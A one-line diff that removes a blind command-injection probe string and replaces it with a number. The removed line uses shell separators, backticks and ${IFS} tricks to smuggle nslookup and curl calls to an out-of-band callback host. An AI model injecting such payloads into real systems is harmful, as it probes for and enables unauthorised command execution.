@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitnhkrylkzik2ca39.bxss.me||curl${IFS}hitnhkrylkzik2ca39.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitnhkrylkzik2ca39.bxss.me||curl${IFS}hitnhkrylkzik2ca39.bxss.me)&`'
+5559150940
